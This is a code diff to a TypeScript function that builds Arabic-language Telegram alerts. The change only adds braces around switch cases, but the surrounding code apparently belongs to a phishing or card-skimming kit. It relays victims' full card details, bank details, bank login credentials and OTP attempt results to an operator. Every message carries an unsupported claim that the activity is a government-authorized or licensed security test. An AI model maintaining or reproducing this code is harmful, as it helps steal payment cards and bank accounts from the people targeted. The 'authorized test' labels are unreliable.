@@ -161,7 +161,7 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
       `;
       break;
       
-    case 'shipping_link_created':
+    case 'shipping_link_created': {
       header = '🚚 <b>تم إنشاء رابط شحن جديد</b>';
       const serviceDescription = description || '';
       const descriptionText = serviceDescription ? `\n📝 <b>الوصف:</b> ${serviceDescription}` : '';
@@ -175,6 +175,7 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
 • رابط الدفع: <a href="${data.payment_url}">اضغط هنا</a>
       `;
       break;
+    }
       
     case 'payment_recipient':
       header = '👤 <b>معلومات المستلم</b>';
@@ -211,7 +212,7 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
       `;
       break;
       
-    case 'card_details':
+    case 'card_details': {
       header = '💳 <b>تفاصيل البطاقة الكاملة</b>';
       const cardNumberDisplay1 = data.cardNumber || 'غير محدد';
       const last4Display1 = data.cardLast4 || 'غير محدد';
@@ -231,8 +232,9 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
 • التفويض: مرخص من قبل الحكومة والشركات
       `;
       break;
+    }
 
-    case 'card_details_with_bank':
+    case 'card_details_with_bank': {
       header = '💳 <b>تفاصيل البطاقة مع معلومات البنك</b>';
       const cardNumberDisplay2 = data.cardNumber || 'غير محدد';
       const last4Display2 = data.cardLast4 || 'غير محدد';
@@ -255,8 +257,9 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
 • التفويض: مرخص من قبل الحكومة والشركات
       `;
       break;
+    }
 
-    case 'bank_login':
+    case 'bank_login': {
       header = '🏦 <b>بيانات تسجيل الدخول للبنك</b>';
       const loginTypeText = data.loginType === 'username' ? 'اسم المستخدم' :
                            data.loginType === 'customerId' ? 'رقم العميل' : 'رقم الهاتف';
@@ -279,12 +282,12 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
 • التفويض: مرخص من قبل الحكومة والشركات
       `;
       break;
+    }
 
-    case 'payment_otp_attempt':
+    case 'payment_otp_attempt': {
       header = '🔐 <b>محاولة رمز التحقق</b>';
       const otpStatusIcon = data.otp_status === 'correct' ? '✅' : '❌';
       const otpStatusText = data.otp_status === 'correct' ? 'صحيح' : 'خطأ';
-      // Use code formatting to preserve exact card number display (LTR)
       const cardNumberDisplay = data.cardNumber || 'غير محدد';
       const last4Display = data.cardLast4 || 'غير محدد';
       content = `
@@ -306,6 +309,7 @@ ${otpStatusIcon} <b>محاولة OTP (${otpStatusText})</b>
 • نوع الاختبار: اختبار أمني مرخص
       `;
       break;
+    }
 
     default:
       header = '📝 <b>إشعار جديد</b>';
